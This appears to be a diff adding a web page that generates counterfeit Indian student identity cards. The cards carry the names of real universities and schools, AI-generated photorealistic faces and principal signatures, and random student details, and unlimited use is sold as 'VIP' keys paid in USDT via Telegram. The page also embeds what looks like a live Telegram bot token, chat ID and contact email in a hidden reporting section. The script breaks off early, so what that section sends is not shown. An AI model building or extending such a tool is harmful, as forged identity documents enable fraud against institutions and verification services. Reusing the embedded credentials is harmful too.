@@ -1,0 +1,2249 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Indian Student ID Card Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Tinos:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Inter", sans-serif;
+      }
+      .font-tinos {
+        font-family: "Tinos", serif;
+      }
+      /* Removed gradient background */
+      .message-box {
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background-color: #4caf50; /* Green */
+        color: white;
+        padding: 15px 20px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        z-index: 1000;
+        opacity: 0;
+        transition: opacity 0.5s ease-in-out;
+        pointer-events: none; /* Allows clicks to pass through */
+        white-space: nowrap; /* Prevent text wrapping */
+      }
+      .message-box.show {
+        opacity: 1;
+        pointer-events: auto;
+      }
+      .message-box.error {
+        background-color: #f44336; /* Red */
+      }
+
+      /* Modal specific styles */
+      .modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.7);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.3s ease, visibility 0.3s ease;
+      }
+      .modal.show {
+        opacity: 1;
+        visibility: visible;
+      }
+      .modal-content {
+        background-color: white;
+        padding: 2rem;
+        border-radius: 1rem;
+        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+        max-width: 90%;
+        width: 400px;
+        position: relative;
+      }
+      .modal-close-button {
+        position: absolute;
+        top: 1rem;
+        right: 1rem;
+        font-size: 1.5rem;
+        line-height: 1;
+        cursor: pointer;
+        color: #4a5568; /* Gray-700 */
+      }
+      .qr-code-container {
+        margin-top: 1rem;
+        text-align: center;
+        display: none; /* Hidden by default */
+      }
+      .qr-code-container.show {
+        display: block;
+      }
+    </style>
+  </head>
+  <body class="bg-gray-100 text-gray-800">
+    <div class="container mx-auto p-4 sm:p-8">
+      <div id="title-header" class="text-center mb-8">
+        <h1 class="text-3xl sm:text-4xl font-bold text-gray-900">
+          Indian Student ID Card Generator
+        </h1>
+        <p class="text-gray-600 mt-2">
+          Fill in the details below or click "Auto-Generate" for a sample with a
+          DeepAI-generated photo, logo, and signature.
+        </p>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:items-start">
+        <!-- Controls and Form -->
+        <div id="controls" class="bg-white p-6 rounded-2xl shadow-lg">
+          <h2 class="text-2xl font-bold mb-6 border-b pb-4">ID Card Details</h2>
+          <div class="space-y-4">
+            <!-- University Info -->
+            <div>
+              <label
+                for="universityName"
+                class="block text-sm font-medium text-gray-700"
+                >University/School Name</label
+              >
+              <input
+                type="text"
+                id="universityName"
+                class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+              />
+            </div>
+            <div>
+              <label
+                for="universityLocation"
+                class="block text-sm font-medium text-gray-700"
+                >Location (e.g., New Delhi, India)</label
+              >
+              <input
+                type="text"
+                id="universityLocation"
+                class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+              />
+            </div>
+            <!-- Student Info -->
+            <div>
+              <label
+                for="studentName"
+                class="block text-sm font-medium text-gray-700"
+                >Student Name</label
+              >
+              <input
+                type="text"
+                id="studentName"
+                class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+              />
+            </div>
+            <div>
+              <label
+                for="fatherName"
+                class="block text-sm font-medium text-gray-700"
+                >Father's Name</label
+              >
+              <input
+                type="text"
+                id="fatherName"
+                class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+              />
+            </div>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <div>
+                <label
+                  for="studentClass"
+                  class="block text-sm font-medium text-gray-700"
+                  >Course / Class</label
+                >
+                <input
+                  type="text"
+                  id="studentClass"
+                  class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+                />
+              </div>
+              <div>
+                <label
+                  for="studentRoll"
+                  class="block text-sm font-medium text-gray-700"
+                  >Roll No.</label
+                >
+                <input
+                  type="text"
+                  id="studentRoll"
+                  class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+                />
+              </div>
+            </div>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <div>
+                <label
+                  for="studentDob"
+                  class="block text-sm font-medium text-gray-700"
+                  >Date of Birth</label
+                >
+                <input
+                  type="date"
+                  id="studentDob"
+                  class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+                />
+              </div>
+              <div>
+                <label
+                  for="session"
+                  class="block text-sm font-medium text-gray-700"
+                  >Session</label
+                >
+                <input
+                  type="text"
+                  id="session"
+                  class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+                />
+              </div>
+            </div>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <div>
+                <label
+                  for="issueDate"
+                  class="block text-sm font-medium text-gray-700"
+                  >Issue Date</label
+                >
+                <input
+                  type="date"
+                  id="issueDate"
+                  class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+                />
+              </div>
+              <div>
+                <label
+                  for="expiryDate"
+                  class="block text-sm font-medium text-gray-700"
+                  >Expiry Date</label
+                >
+                <input
+                  type="date"
+                  id="expiryDate"
+                  class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+                />
+              </div>
+            </div>
+            <!-- Contact Info -->
+            <div>
+              <label
+                for="studentAddress"
+                class="block text-sm font-medium text-gray-700"
+                >Address</label
+              >
+              <input
+                type="text"
+                id="studentAddress"
+                class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
+              />
+            </div>
+            <!-- Image Uploads -->
+            <div>
+              <label
+                for="studentPhoto"
+                class="block text-sm font-medium text-gray-700"
+                >Student Photo</label
+              >
+              <input
+                type="file"
+                id="studentPhoto"
+                accept="image/*"
+                class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-indigo-50 file:text-indigo-600 hover:file:bg-indigo-100"
+              />
+            </div>
+            <div>
+              <label
+                for="schoolLogo"
+                class="block text-sm font-medium text-gray-700"
+                >School Logo</label
+              >
+              <input
+                type="file"
+                id="schoolLogo"
+                accept="image/*"
+                class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-indigo-50 file:text-indigo-600 hover:file:bg-indigo-100"
+              />
+            </div>
+            <div>
+              <label
+                for="principalSignature"
+                class="block text-sm font-medium text-gray-700"
+                >Principal's Signature</label
+              >
+              <input
+                type="file"
+                id="principalSignature"
+                accept="image/*"
+                class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-indigo-50 file:text-indigo-600 hover:file:bg-indigo-100"
+              />
+            </div>
+            <!-- Buttons -->
+            <div class="pt-6 grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <button
+                id="generateButton"
+                class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
+              >
+                Auto-Generate Sample
+              </button>
+              <button
+                id="downloadButton"
+                class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-green-600 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500"
+              >
+                Download
+              </button>
+            </div>
+
+            <!-- VIP Code Section - MOVED HERE -->
+            <div class="pt-6 border-t mt-6">
+              <h3 class="text-xl font-bold mb-4">VIP Access</h3>
+              <p class="text-sm text-gray-600 mb-3" id="vipStatusMessage">
+                Enter VIP code for unlimited generations.
+              </p>
+              <p
+                class="text-sm text-gray-600 mb-3"
+                id="generationCountMessage"
+              ></p>
+              <div class="text-sm text-gray-700 mb-2">
+                Your Device ID:
+                <span id="deviceIdDisplay" class="font-mono text-gray-900"
+                  >N/A</span
+                >
+              </div>
+              <div class="flex space-x-2 mb-4">
+                <input
+                  type="password"
+                  id="vipCodeInput"
+                  autocomplete="new-password"
+                  placeholder="Enter VIP Code"
+                  class="flex-grow px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500 sm:text-sm"
+                />
+                <button
+                  id="vipUnlockButton"
+                  class="flex-shrink-0 py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-purple-600 hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-purple-500"
+                >
+                  Unlock Unlimited
+                </button>
+              </div>
+              <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <button
+                  id="contactVipButton"
+                  class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
+                >
+                  Contact for VIP Key
+                </button>
+                <button
+                  id="changeVipKeyButton"
+                  class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500"
+                >
+                  Change VIP Key (Client-Side)
+                </button>
+              </div>
+            </div>
+
+            <!-- Telegram Configuration Section - NEW -->
+            <div
+              class="pt-6 border-t mt-6"
+              id="telegramConfigSection"
+              style="display: none"
+            >
+              <h3 class="text-xl font-bold mb-4">Telegram Reporting Config</h3>
+              <p class="text-sm text-red-600 mb-3 font-semibold">
+                WARNING: Storing these keys in client-side code is INSECURE for
+                production environments. Use a backend for proper security.
+              </p>
+              <div>
+                <label
+                  for="telegramBotToken"
+                  class="block text-sm font-medium text-gray-700"
+                  >Telegram Bot Token</label
+                >
+                <input
+                  type="password"
+                  id="telegramBotToken"
+                  autocomplete="new-password"
+                  class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-teal-500 focus:border-teal-500 sm:text-sm"
+                  placeholder="Enter your bot token"
+                  value="7745172120:AAHYKYJ64hhhhye2-J5i28kXYdqV_9gFQuM"
+                />
+              </div>
+              <div class="mt-4">
+                <label
+                  for="telegramChatId"
+                  class="block text-sm font-medium text-gray-700"
+                  >Telegram Chat ID</label
+                >
+                <input
+                  type="text"
+                  id="telegramChatId"
+                  autocomplete="off"
+                  class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-teal-500 focus:border-teal-500 sm:text-sm"
+                  placeholder="Enter your chat ID (e.g., -123456789)"
+                  value="1204684142"
+                />
+              </div>
+            </div>
+
+            <!-- Custom Photo Prompt Section (VIP only) - STILL HERE -->
+            <div
+              id="customPhotoPromptSection"
+              class="pt-6 border-t mt-6 hidden"
+            >
+              <h3 class="text-xl font-bold mb-4">Custom Student Photo</h3>
+              <p class="text-sm text-gray-600 mb-3">
+                You can use your own text prompt for the student photo
+                generation!
+              </p>
+              <div class="mb-4">
+                <label
+                  for="customPhotoPromptInput"
+                  class="block text-sm font-medium text-gray-700"
+                  >Your Custom Photo Prompt:</label
+                >
+                <textarea
+                  id="customPhotoPromptInput"
+                  rows="3"
+                  class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-pink-500 focus:border-pink-500 sm:text-sm"
+                  placeholder="e.g., A young Indian male student with glasses, smiling, wearing a blue shirt"
+                ></textarea>
+              </div>
+              <button
+                id="togglePhotoPromptButton"
+                class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-pink-600 hover:bg-pink-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-pink-500"
+              >
+                Use Custom Photo Prompt
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- ID Card Preview -->
+        <div id="idCardPreviewWrapper">
+          <div class="lg:sticky lg:top-8">
+            <div
+              id="idCardContainer"
+              class="w-[320px] min-h-[512px] bg-white rounded-3xl shadow-2xl p-2 flex flex-col border-4 border-gray-200 mx-auto"
+            >
+              <!-- Inner card -->
+              <div
+                class="w-full h-full border-2 border-gray-300 rounded-2xl flex flex-col overflow-hidden bg-white"
+              >
+                <!-- Header -->
+                <div class="text-center pt-4 pb-2 px-4">
+                  <div class="flex justify-center items-center mb-2 h-20">
+                    <img
+                      id="cardSchoolLogo"
+                      src="https://placehold.co/128x80/FFFFFF/CCCCCC?text=Logo"
+                      alt="School Logo"
+                      class="max-w-full max-h-full object-contain"
+                      crossorigin="anonymous"
+                      onerror="this.onerror=null;this.src='https://placehold.co/128x80/FFFFFF/CCCCCC?text=Logo';"
+                    />
+                  </div>
+                  <h3
+                    id="cardUniversityName"
+                    class="font-tinos font-bold text-lg uppercase tracking-wider"
+                  ></h3>
+                  <p
+                    id="cardUniversityLocation"
+                    class="font-semibold text-xs text-gray-500"
+                  ></p>
+                  <h4
+                    class="font-semibold text-xs text-gray-500 tracking-widest mt-1"
+                  >
+                    STUDENT IDENTITY CARD
+                  </h4>
+                  <div class="h-1 w-full bg-orange-500 mt-2"></div>
+                </div>
+
+                <!-- Main Content -->
+                <div
+                  class="flex-grow px-4 pt-2 pb-2 flex flex-col items-center"
+                >
+                  <!-- Student Photo -->
+                  <div
+                    class="w-28 h-32 rounded-md overflow-hidden shadow-lg border-2 border-gray-200 mb-2 flex items-center justify-center bg-gray-100"
+                  >
+                    <img
+                      id="cardStudentPhoto"
+                      src="https://placehold.co/112x128/E0E0E0/BDBDBD?text=Photo"
+                      alt="Student Photo"
+                      class="w-full h-full object-cover"
+                      crossorigin="anonymous"
+                    />
+                  </div>
+                  <p class="text-center font-bold text-sm" id="cardSession"></p>
+
+                  <!-- Details -->
+                  <div class="w-full text-xs mt-2 mb-2">
+                    <div
+                      class="flex justify-between py-1 border-b border-gray-200"
+                    >
+                      <span class="font-bold text-gray-600">Name:</span>
+                      <span
+                        id="cardStudentName"
+                        class="font-medium text-right"
+                      ></span>
+                    </div>
+                    <div
+                      class="flex justify-between py-1 border-b border-gray-200"
+                    >
+                      <span class="font-bold text-gray-600"
+                        >Father's Name:</span
+                      >
+                      <span
+                        id="cardFatherName"
+                        class="font-medium text-right"
+                      ></span>
+                    </div>
+                    <div
+                      class="flex justify-between py-1 border-b border-gray-200"
+                    >
+                      <span class="font-bold text-gray-600">Roll No:</span>
+                      <span
+                        id="cardStudentRoll"
+                        class="font-medium text-right"
+                      ></span>
+                    </div>
+                    <div
+                      class="flex justify-between py-1 border-b border-gray-200"
+                    >
+                      <span class="font-bold text-gray-600">Course:</span>
+                      <span
+                        id="cardStudentClass"
+                        class="font-medium text-right"
+                      ></span>
+                    </div>
+                    <div
+                      class="flex justify-between py-1 border-b border-gray-200"
+                    >
+                      <span class="font-bold text-gray-600">DOB:</span>
+                      <span
+                        id="cardStudentDob"
+                        class="font-medium text-right"
+                      ></span>
+                    </div>
+                    <div class="py-1">
+                      <p class="font-bold text-gray-600">Address:</p>
+                      <p
+                        id="cardStudentAddress"
+                        class="font-medium text-left"
+                      ></p>
+                    </div>
+                  </div>
+
+                  <!-- Dates & Signature -->
+                  <div
+                    class="w-full flex justify-between items-end mt-auto pt-4"
+                  >
+                    <div class="text-xs text-left">
+                      <div class="flex space-x-4">
+                        <div>
+                          <p class="font-bold">Issue Date</p>
+                          <p id="cardIssueDate"></p>
+                        </div>
+                        <div>
+                          <p class="font-bold">Expiry Date</p>
+                          <p id="cardExpiryDate"></p>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="text-right">
+                      <img
+                        id="cardPrincipalSignature"
+                        src="https://placehold.co/140x56/FFFFFF/CCCCCC?text=Signature"
+                        alt="Signature"
+                        class="h-14 inline-block object-contain"
+                        crossorigin="anonymous"
+                      />
+                      <p
+                        id="cardPrincipalName"
+                        class="text-xs font-semibold text-gray-700 border-t-2 border-gray-400 pt-1"
+                      >
+                        Principal
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Footer -->
+                <div class="bg-green-600 h-4 mt-auto"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Message Box for notifications -->
+    <div id="messageBox" class="message-box"></div>
+
+    <!-- VIP Purchase Modal -->
+    <div id="vipPurchaseModal" class="modal">
+      <div class="modal-content">
+        <span class="modal-close-button" id="closeModalButton">&times;</span>
+        <h2 class="text-2xl font-bold mb-6 text-center text-gray-800">
+          Purchase VIP Key
+        </h2>
+
+        <div class="space-y-4">
+          <button
+            id="buyTelegramButton"
+            class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-500 hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-all duration-200 ease-in-out transform hover:scale-105"
+          >
+            Buy via Telegram
+          </button>
+          <button
+            id="payQrButton"
+            class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-green-500 hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 transition-all duration-200 ease-in-out transform hover:scale-105"
+          >
+            Pay Directly (QR Code)
+          </button>
+        </div>
+
+        <div id="qrCodeContainer" class="qr-code-container hidden">
+          <p class="text-sm text-gray-600 mb-2">
+            Scan this QR code to complete your payment.
+          </p>
+          <img
+            id="paymentQrCode"
+            src="https://placehold.co/200x200/28a745/ffffff?text=QR+Code"
+            alt="Payment QR Code"
+            class="mx-auto border border-gray-300 rounded-md p-2"
+          />
+          <p class="text-xs text-gray-500 mt-2">
+            <p>
+              <strong>Note:</strong> Please send exactly <strong>$10 USDT</strong> to complete the transaction.<br>
+              After sending, kindly send a <strong>screenshot of the transaction</strong> to us via <strong>Telegram</strong>.
+            </p>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        // --- CONSTANTS ---
+        const GENERATION_LIMIT_SECONDS = 60 * 60; // 3 minutes = 180 seconds for single generation cooldown
+        const NON_VIP_DAILY_LIMIT = 3; // 3 generations per day for non-VIP users
+        const VIP_DAILY_LIMIT = 15; // 15 generations per day for VIP users
+
+        // IMPORTANT: For true security, these VIP_KEY_BINDINGS should be validated on a backend server.
+        // Client-side validation can always be bypassed.
+        const VIP_KEY_BINDINGS = [
+          {
+            key: "7171",
+            hwid: "83A3-8A04-4421-8361-209727154F38",
+          },
+          {
+            key: "DA",
+            hwid: "C1DC50A4-0988-4B7A-B90F-6B57B0A48CBF",
+          },
+          {
+            key: "LIDA",
+            hwid: "C1DC50A4-0988-4B7A-B90F-6B57B0A48CBF",
+          },
+          { key: "LIHOV", hwid: null }, // Example of a key not tied to a specific HWID
+        ];
+
+        const CONTACT_EMAIL = "vandapro7@gmail.com"; // Placeholder email for VIP key contact
+        const TELEGRAM_LINK = "https://t.me/NowTryWithMe"; // Replace with your actual Telegram link
+        const QR_CODE_PAYMENT_URL =
+          "https://raw.githubusercontent.com/LIHOV888/leeminhov/3e85a6340668dc3de2469ad69934f8cea8efd4dd/img/pay.png"; // Fixed raw GitHub URL for QR code image
+
+        const DEFAULT_PHOTO_PROMPT_MALE =
+          "High-quality portrait of an Indian university student, age 18-25, male, realistic face, natural expression, academic setting, clear facial features, photorealistic";
+        const DEFAULT_PHOTO_PROMPT_FEMALE =
+          "High-quality portrait of an Indian university student, age 18-25, female, realistic face, natural expression, academic setting, clear facial features, photorealistic";
+
+        // --- DATA FOR AUTO-GENERATION ---
+        const sampleData = {
+          firstNames: [
+            "Aarav",
+            "Vivaan",
+            "Aditya",
+            "Vihaan",
+            "Arjun",
+            "Sai",
+            "Reyansh",
+            "Ayaan",
+            "Krishna",
+            "Ishaan",
+            "Saanvi",
+            "Aanya",
+            "Aadhya",
+            "Aaradhya",
+            "Ananya",
+            "Pari",
+            "Diya",
+            "Myra",
+            "Anika",
+            "Avni",
+            "Rohan",
+            "Vikram",
+            "Kabir",
+            "Dev",
+            "Aryan",
+            "Zoya",
+            "Isha",
+            "Tara",
+            "Kiara",
+            "Navya",
+            "Advik",
+            "Rudra",
+            "Arnav",
+            "Dhruv",
+            "Veer",
+            "Shanaya",
+            "Siya",
+            "Riya",
+            "Anvi",
+            "Ishita",
+            "Karan",
+            "Manish",
+            "Suresh",
+            "Rahul",
+            "Deepak",
+            "Sanjay",
+            "Amit",
+            "Rakesh",
+            "Sunil",
+            "Vikas",
+            "Neha",
+            "Pooja",
+            "Sneha",
+            "Anjali",
+            "Priya",
+            "Kavita",
+            "Ritu",
+            "Sonal",
+            "Divya",
+            "Nisha",
+            "Meena",
+            "Rekha",
+            "Seema",
+            "Geeta",
+            "Lata",
+            "Kumari",
+            "Bhavna",
+            "Chitra",
+            "Disha",
+            "Esha",
+            "Falguni",
+            "Gita",
+            "Harini",
+            "Indira",
+            "Jaya",
+            "Kiran",
+            "Lalita",
+            "Mala",
+            "Nandini",
+            "Ojasvi",
+            "Pallavi",
+            "Rachna",
+            "Sakshi",
+            "Tanvi",
+            "Usha",
+            "Vandana",
+            "Yamini",
+            "Zeenat",
+          ],
+          lastNames: [
+            "Sharma",
+            "Verma",
+            "Gupta",
+            "Singh",
+            "Kumar",
+            "Patel",
+            "Reddy",
+            "Mehta",
+            "Jain",
+            "Khan",
+            "Yadav",
+            "Mishra",
+            "Dubey",
+            "Trivedi",
+            "Chauhan",
+            "Rathore",
+            "Pawar",
+            "Nair",
+            "Menon",
+            "Iyer",
+            "Joshi",
+            "Shah",
+            "Kapoor",
+            "Malhotra",
+            "Chatterjee",
+            "Mukherjee",
+            "Bose",
+            "Das",
+            "Ghosh",
+            "Ibrahim",
+            "Khan",
+            "Naidu",
+            "Rao",
+            "Saxena",
+            "Tiwari",
+            "Verma",
+            "Yadav",
+            "Zaveri",
+            "Bhatt",
+            "Choudhury",
+            "Dutta",
+            "Gandhi",
+            "Joshi",
+            "Kaur",
+            "Lal",
+            "Mahajan",
+            "Nair",
+            "Pandey",
+            "Reddy",
+            "Sethi",
+            "Singh",
+            "Tripathi",
+            "Verma",
+            "Wadhwa",
+            "Yadav",
+            "Zaveri",
+          ],
+          principalNames: [
+            "Dr. R. K. Sharma",
+            "Mrs. Sunita Gupta",
+            "Mr. V. S. Chauhan",
+            "Dr. Meenakshi Iyer",
+            "Prof. Alok Verma",
+            "Dr. Anjali Menon",
+            "Dr. Rajesh Kumar",
+            "Mrs. Neeta Singh",
+            "Mr. Sanjay Patel",
+            "Dr. Kavita Joshi",
+            "Prof. Anil Kapoor",
+            "Dr. Sunita Reddy",
+          ],
+          universities: [
+            {
+              name: "University of Delhi",
+              location: "New Delhi, India",
+              courses: ["B.Com (Hons)", "B.A. English", "B.Sc. Physics"],
+              courseCodes: ["DCO", "DEN", "DPH"],
+            },
+            {
+              name: "IIT Bombay",
+              location: "Mumbai, India",
+              courses: ["B.Tech CSE", "B.Tech Mech", "M.Sc. Chemistry"],
+              courseCodes: ["IBC", "IBM", "IMC"],
+            },
+            {
+              name: "University of Mumbai",
+              location: "Mumbai, India",
+              courses: ["B.A. History", "B.M.S.", "B.Sc. IT"],
+              courseCodes: ["MHI", "MMS", "MIT"],
+            },
+            {
+              name: "Savitribai Phule Pune University",
+              location: "Pune, India",
+              courses: ["B.B.A.", "B.C.A.", "M.A. Economics"],
+              courseCodes: ["PBA", "PCA", "PEC"],
+            },
+            {
+              name: "Anna University",
+              location: "Chennai, India",
+              courses: ["B.E. Civil", "B.Arch", "M.Tech IT"],
+              courseCodes: ["ACI", "AAC", "AIT"],
+            },
+            {
+              name: "Jawaharlal Nehru University",
+              location: "New Delhi, India",
+              courses: [
+                "M.A. Sociology",
+                "M.Sc. Life Sciences",
+                "B.A. Foreign Languages",
+              ],
+              courseCodes: ["JSO", "JLS", "JFL"],
+            },
+            {
+              name: "Banaras Hindu University",
+              location: "Varanasi, India",
+              courses: [
+                "B.A. (Hons.) Arts",
+                "B.Sc. (Hons.) Maths",
+                "LL.B. (Hons.)",
+              ],
+              courseCodes: ["BHA", "BHM", "BHL"],
+            },
+            {
+              name: "Amity University",
+              location: "Noida, India",
+              courses: ["B.Tech (AI)", "B.Des (Fashion)", "BBA"],
+              courseCodes: ["ATE", "AFD", "ABB"],
+            },
+            {
+              name: "Delhi Public School, R.K. Puram",
+              location: "New Delhi, India",
+              courses: ["Class XI Science", "Class XII Commerce", "Class X"],
+              courseCodes: ["DPSXI", "DPSXII", "DPSX"],
+            },
+            {
+              name: "Indian Institute of Technology Madras",
+              location: "Chennai, India",
+              courses: ["B.Tech Electrical", "B.Tech Mechanical", "M.Sc Physics"],
+              courseCodes: ["IEM", "IMM", "MSP"],
+            },
+            {
+              name: "Indian Institute of Science",
+              location: "Bangalore, India",
+              courses: ["B.Sc Biology", "B.Sc Chemistry", "M.Tech CS"],
+              courseCodes: ["BIB", "BIC", "MCS"],
+            },
+            {
+              name: "National Institute of Technology Karnataka",
+              location: "Surathkal, India",
+              courses: ["B.Tech Civil", "B.Tech Computer Science", "M.Sc Maths"],
+              courseCodes: ["BTC", "BTC", "MSM"],
+            },
+            {
+              name: "University of Calcutta",
+              location: "Kolkata, India",
+              courses: ["B.A. Arts", "B.Sc. Science", "M.A. History"],
+              courseCodes: ["BAA", "BSS", "MAH"],
+            },
+            {
+              name: "University of Hyderabad",
+              location: "Hyderabad, India",
+              courses: ["B.A. English", "B.Sc. Physics", "M.Sc. Chemistry"],
+              courseCodes: ["BAE", "BSP", "MSC"],
+            },
+            {
+              name: "Aligarh Muslim University",
+              location: "Aligarh, India",
+              courses: ["B.Com", "B.A. Urdu", "M.A. Islamic Studies"],
+              courseCodes: ["BCO", "BAU", "MAI"],
+            },
+            {
+              name: "Jamia Millia Islamia",
+              location: "New Delhi, India",
+              courses: ["B.Tech CS", "B.A. Political Science", "M.Sc. Maths"],
+              courseCodes: ["BTC", "BPS", "MSM"],
+            },
+            {
+              name: "University of Rajasthan",
+              location: "Jaipur, India",
+              courses: ["B.A. History", "B.Sc. Chemistry", "M.A. Sociology"],
+              courseCodes: ["BAH", "BSC", "MAS"],
+            },
+            {
+              name: "Panjab University",
+              location: "Chandigarh, India",
+              courses: ["B.Com", "B.Sc. IT", "M.A. Economics"],
+              courseCodes: ["BCO", "BSI", "MAE"],
+            },
+            {
+              name: "University of Madras",
+              location: "Chennai, India",
+              courses: ["B.A. Tamil", "B.Sc. Physics", "M.Sc. CS"],
+              courseCodes: ["BAT", "BSP", "MSC"],
+            },
+          ],
+        };
+
+        // --- GET ELEMENTS ---
+        const inputs = {
+          universityName: document.getElementById("universityName"),
+          universityLocation: document.getElementById("universityLocation"),
+          studentName: document.getElementById("studentName"),
+          fatherName: document.getElementById("fatherName"),
+          studentClass: document.getElementById("studentClass"),
+          studentRoll: document.getElementById("studentRoll"),
+          studentDob: document.getElementById("studentDob"),
+          session: document.getElementById("session"),
+          issueDate: document.getElementById("issueDate"),
+          expiryDate: document.getElementById("expiryDate"),
+          studentAddress: document.getElementById("studentAddress"),
+          studentPhoto: document.getElementById("studentPhoto"),
+          schoolLogo: document.getElementById("schoolLogo"),
+          principalSignature: document.getElementById("principalSignature"),
+          telegramBotToken: document.getElementById("telegramBotToken"), // NEW
+          telegramChatId: document.getElementById("telegramChatId"), // NEW
+        };
+
+        const cards = {
+          universityName: document.getElementById("cardUniversityName"),
+          universityLocation: document.getElementById("cardUniversityLocation"),
+          studentName: document.getElementById("cardStudentName"),
+          fatherName: document.getElementById("cardFatherName"),
+          studentClass: document.getElementById("cardStudentClass"),
+          studentRoll: document.getElementById("cardStudentRoll"),
+          studentDob: document.getElementById("cardStudentDob"),
+          session: document.getElementById("cardSession"),
+          issueDate: document.getElementById("cardIssueDate"),
+          expiryDate: document.getElementById("cardExpiryDate"),
+          studentAddress: document.getElementById("cardStudentAddress"),
+          studentPhoto: document.getElementById("cardStudentPhoto"),
+          schoolLogo: document.getElementById("cardSchoolLogo"),
+          principalSignature: document.getElementById("cardPrincipalSignature"),
+          principalName: document.getElementById("cardPrincipalName"),
+        };
+
+        const generateButton = document.getElementById("generateButton");
+        const downloadButton = document.getElementById("downloadButton");
